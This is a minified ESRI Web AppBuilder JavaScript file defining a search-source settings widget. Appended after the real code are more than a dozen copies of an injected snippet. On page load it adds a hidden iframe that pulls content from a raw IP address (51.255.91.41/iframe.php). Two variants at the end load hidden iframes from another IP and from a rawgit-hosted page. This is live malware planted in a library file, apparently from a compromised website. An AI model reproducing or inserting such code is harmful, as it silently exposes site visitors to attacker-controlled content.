// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/dom-class dojo/dom-construct dojo/on ./settingComponents ./SettingBoxedDivs ./SettingBufferBlock ./SettingCheckboxLabeled ./SettingContainer ./SettingDropdownLabeled ./SettingFieldListLabeled ./SettingInputLabeled ./SettingObject ./SettingOptionsTable".split(" "),function(d,t,f,n,p,u,k,v,q,h,l,r,w,e,x,y){return t(x,{_inputControl:null,_mainControl:null,_detailsDiv:null,_detailsTitle:null,_detailsCheckbox:null,_sourceDisplay:null,_iCurrentSource:-1,
_sourceMenuItems:[],_newSourceTypeMenuItems:[],_nls:null,_webmapFeatureLayers:[],_fieldListPicker:null,_displayFieldInput:null,constructor:function(b,a,c,g,d){this._nls=a;this._webmapFeatureLayers=d;this._newSourceTypeMenuItems=[a.groupingLabels.featureLayerDetails,a.groupingLabels.geocoderDetails];this._inputControl=new y(null,"third-width","",a.propertyLabels.name,null,"",f.hitch(this,this._onRowSelected),f.hitch(this,this._onRowDeleted),f.hitch(this,this._onRowMoved));this._detailsDiv=k.container("two-thirds-width optionsTableHeaderHeight",
"majorTrailingVertGap",[]);b=k.addTextButtonDropdownCtl("",a.buttons.addSearchSource,this._newSourceTypeMenuItems);this.own(u(b.ctl,"click",f.hitch(this,this._onAddSearchSourceMenuItemClick)));this._mainControl=new l(null,c||"","majorTrailingVertGap",a.groupingLabels.searchSources,"full-width",[new e("allPlaceholder",!1,"full-width","third-width","two-thirds-width",a.propertyLabels.placeholderTextForAllSources),new h("showInfoWindowOnSelect","full-width","third-width","two-thirds-width",a.propertyLabels.showPopupForFoundItem),
new v(null,[b.div,k.container("full-width flexbox","majorTrailingHorizGap",[this._inputControl.div(),this._detailsDiv])])]);this._mainDiv=this._mainControl.div()},setConfig:function(){this._mainControl.setConfig(this._config);this._config.sources=d.filter(this._config.sources,f.hitch(this,function(b){return"locator"===b.type||"query"===b.type&&d.some(this._webmapFeatureLayers,function(a){return b.layerId===a.layerId})}));this._sourceMenuItems=d.map(this._config.sources,function(b){return{item:b.name}});
this._inputControl.setValue(this._sourceMenuItems);0<this._sourceMenuItems.length&&this._inputControl.selectTableRow(0)},getConfig:function(){this._mainControl.getConfig(this._config);this._setDetails(-1)},_onAddSearchSourceMenuItemClick:function(b){var a={};b.target.innerText===this._newSourceTypeMenuItems[0]?(b=f.clone(this._config.searchSourceTemplates.query),b.name=this._webmapFeatureLayers[0].name,b.displayField=this._webmapFeatureLayers[0].displayField,b.layerId=this._webmapFeatureLayers[0].layerId,
b.url=this._webmapFeatureLayers[0].url):b=f.clone(this._config.searchSourceTemplates.locator);b.buffer=f.clone(this._config.bufferTemplate);this._config.sources.push(b);a.item=b.name;this._sourceMenuItems.push(a);this._inputControl.addRowToTable(a);this._inputControl.selectTableRow(this._config.sources.length-1)},_setDetails:function(b){var a=this._sourceMenuItems.length,c,g=[],m=[];this._removeCurrentDetails();0<=b&&b<a&&(c=this._config.sources[b],"query"===c.type?(d.map(this._webmapFeatureLayers,
function(a){g.push({label:a.name,value:a.layerId});c.layerId===a.layerId&&d.map(a.fields,function(a){m.push({label:a.alias||a.name,value:a.name})})}),this._fieldListPicker=new w("searchFields",this._nls,"full-width","details-label","details-value",this._nls.propertyLabels.searchFields,this._nls.hints.csvNameList,m),this._displayFieldInput=new r("displayField","full-width","details-label","details-value",this._nls.propertyLabels.displayField,"",m,f.hitch(this,this._onChangeField)),this._sourceDisplay=
new l(null,"","majorTrailingVertGap",this._nls.groupingLabels.featureLayerDetails,"full-width",[new r("name","full-width","details-label","details-value",this._nls.propertyLabels.name,"",g,f.hitch(this,this._onChangeFeatureLayer)),new e("placeholder",!1,"full-width","details-label","details-value",this._nls.propertyLabels.placeholderText),this._fieldListPicker,this._displayFieldInput,new e("maxSuggestions",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumSuggestions,
"6"),new e("maxResults",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumResults,"6"),new e("zoomScale",!0,"full-width","details-label","details-value",this._nls.propertyLabels.zoomScale,"50000","","1:"),new h("exactMatch","full-width","details-label","details-value",this._nls.propertyLabels.exactMatch),new h("searchInCurrentMapExtent","full-width","details-label","details-value",this._nls.propertyLabels.limitSearchToMapExtent),new q("buffer",this._nls,"full-width",
"details-label","details-value",this._config.bufferTemplate,this._nls.propertyLabels.bufferDefaultDistance,"100")]),c.name=this._convertLayerNameToLayerId(c.name)):"locator"===c.type&&(this._sourceDisplay=new l(null,"","majorTrailingVertGap",this._nls.groupingLabels.geocoderDetails,"full-width",[new e("url",!1,"full-width","details-label","details-value",this._nls.propertyLabels.url),new e("name",!1,"full-width","details-label","details-value",this._nls.propertyLabels.name),new e("placeholder",!1,
"full-width","details-label","details-value",this._nls.propertyLabels.placeholderText),new e("countryCode",!1,"full-width","details-label","details-value",this._nls.propertyLabels.countryRegionCodes,this._nls.placeholders.countryRegionCodes),new e("maxSuggestions",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumSuggestions,"6"),new e("maxResults",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumResults,"6"),new e("zoomScale",!0,"full-width",
"details-label","details-value",this._nls.propertyLabels.zoomScale,"50000","","1:"),new h("searchInCurrentMapExtent","full-width","details-label","details-value",this._nls.propertyLabels.limitSearchToMapExtent),new q("buffer",this._nls,"full-width","details-label","details-value",this._config.bufferTemplate,this._nls.propertyLabels.bufferDefaultDistance,"100")])),this._sourceDisplay&&(c.buffer.bufferUnitsMenu=this._convertUnitCodesToLabels(c.buffer.bufferUnitsMenu),this._sourceDisplay.setConfig(c),
p.place(this._sourceDisplay.div(),this._detailsDiv),n.remove(this._detailsDiv,"hidden"),this._iCurrentSource=b))},_convertLayerIdToLayerName:function(b){var a=b;d.some(this._webmapFeatureLayers,function(c){return c.layerId===b?(a=c.name,!0):!1});return a},_convertLayerNameToLayerId:function(b){var a=b;d.some(this._webmapFeatureLayers,function(c){return c.name===b?(a=c.layerId,!0):!1});return a},_onChangeFeatureLayer:function(b){var a,c=[];0<=this._iCurrentSource&&(a=this._config.sources[this._iCurrentSource],
d.some(this._webmapFeatureLayers,f.hitch(this,function(g){return b===g.layerId?(a.name=g.layerId,a.searchFields=[],a.displayField=g.displayField,a.layerId=g.layerId,a.url=g.url,d.map(g.fields,function(a){c.push({label:a.alias||a.name,value:a.name})}),this._fieldListPicker.setFieldList(c),this._fieldListPicker.setDisplay(),this._displayFieldInput.setOptions(c),this._inputControl.renameTableRow(this._iCurrentSource,g.name),!0):!1})))},_onChangeField:function(b){var a;0<=this._iCurrentSource&&(a=this._config.sources[this._iCurrentSource],
a.displayField=b)},_onRowSelected:function(b){this._setDetails(b.rowIndex)},_onRowMoved:function(b,a){var c;this._removeCurrentDetails();c=a?b.rowIndex+1:b.rowIndex-1;a=this._sourceMenuItems.splice(c,1);c=this._config.sources.splice(c,1);this._sourceMenuItems.splice(b.rowIndex,0,a[0]);this._config.sources.splice(b.rowIndex,0,c[0]);this._inputControl.selectTableRow(b.rowIndex)},_onRowDeleted:function(b,a,c){this._removeCurrentDetails();this._sourceMenuItems.splice(c,1);this._config.sources.splice(c,
1);0<this._sourceMenuItems.length&&this._inputControl.selectTableRow(0)},_removeCurrentDetails:function(){var b;0<=this._iCurrentSource&&(n.add(this._detailsDiv,"hidden"),b=this._config.sources[this._iCurrentSource],this._sourceDisplay.getConfig(b),b.buffer.bufferUnitsMenu=this._convertLabelsToUnitCodes(b.buffer.bufferUnitsMenu),"query"===b.type&&(b.name=this._convertLayerIdToLayerName(b.name)),p.empty(this._detailsDiv),this._sourceDisplay=null,this._iCurrentSource=-1)},_convertUnitCodesToLabels:function(b){var a=
[],c=jimuNls.units;d.forEach(b,function(b){switch(b){case "CENTIMETERS":a.push(c.centimeters);break;case "INCHES":a.push(c.inches);break;case "FEET":a.push(c.feet);break;case "YARDS":a.push(c.yards);break;case "METERS":a.push(c.meters);break;case "KILOMETERS":a.push(c.kilometers);break;case "MILES":a.push(c.miles);break;default:a.push(b)}});return a},_convertLabelsToUnitCodes:function(b){var a=[],c=jimuNls.units;d.forEach(b,function(b){switch(b){case c.centimeters:a.push("CENTIMETERS");break;case c.inches:a.push("INCHES");
break;case c.feet:a.push("FEET");break;case c.yards:a.push("YARDS");break;case c.meters:a.push("METERS");break;case c.kilometers:a.push("KILOMETERS");break;case c.miles:a.push("MILES");break;default:a.push(b)}});return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});